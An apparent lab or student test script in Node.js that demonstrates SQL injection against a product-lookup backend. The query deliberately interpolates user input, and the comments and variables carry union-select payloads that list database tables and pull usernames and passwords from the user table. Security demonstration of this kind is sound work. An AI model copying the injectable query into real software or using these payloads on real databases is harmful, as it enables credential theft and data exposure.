// For the purpose of easier testing only, demo should be done through frontend

// Payloads is 8 or 1=1
// 8 GROUP BY p.productid UNION SELECT null, null, null, null, null, null, null, null, null, p.productid, table_schema, table_name FROM INFORMATION_SCHEMA.TABLES, product p

const readline = require('node:readline').createInterface({
    input: process.stdin,
    output: process.stdout,
});
const db = require('../BackEnd/model/databaseConfig')

// 7: Get product by productid
function getProduct(productid, callback) {
    var dbConn = db.getConnection();
    dbConn.connect(function (err) {
        if (err) {
            return callback(err, null);
        } else {
            // (^・ω・^§)ﾉ
            original_query = `select p.productid, p.name, p.description, c.categoryid, category categoryname, p.brand, p.price, COUNT(distinct r.reviewid) reviewcount, pi.path imagepath, AVG( r.rating) rating, d.discountid, d.discount_percentage
            from product p
            join category c on c.categoryid = p.categoryid  
            left join reviews r on r.productid = p.productid
            left join productimages pi on pi.productid = p.productid 
            left join discount d on d.productid = p.productid 
            where p.productid = ${productid}
            GROUP BY p.productid`
            
            simulated_query = `select p.productid, p.name, p.description, c.categoryid, category categoryname, p.brand, p.price, COUNT(distinct r.reviewid) reviewcount, pi.path imagepath, AVG( r.rating) rating, d.discountid, d.discount_percentage
            from product p
            join category c on c.categoryid = p.categoryid  
            left join reviews r on r.productid = p.productid
            left join productimages pi on pi.productid = p.productid 
            left join discount d on d.productid = p.productid 
            where p.productid = 8 GROUP BY p.productid UNION SELECT null, null, null, null, null, null, u.username, u.password, u.type, p.productid, table_schema, table_name FROM INFORMATION_SCHEMA.TABLES, product p, user u
            GROUP BY p.productid`

            union_select = `SELECT null, null, null, null, null, null, 
            null, null, null, p.productid, null, 
            null FROM product p 
            JOIN (
                SELECT k.table_schema, 
                k.table_name
                FROM
                INFORMATION_SCHEMA.TABLES k
            ) p ON 1 = 1
            GROUP BY p.productid`

            debug = `SELECT * FROM user`
            dbConn.query(
                union_select, [], 
                function (err, results) {
                    dbConn.end();
                    if (err) {
                        console.log(err);
                    }
                    return callback(err, results);
                }
            );
        }
    });
}

readline.question("Productid: ", id => {
    getProduct(id, (err, result) => {
        if (err) {
            console.log("Error")
        } else {
            result.forEach(element => {
                console.log(element)
                    
            });
        }
    })
    readline.close()
})

// getProduct(0, (err, result) => {
//     if (err) {
//         console.log("Error")
//     } else {
//         console.log(result)
//     }
// })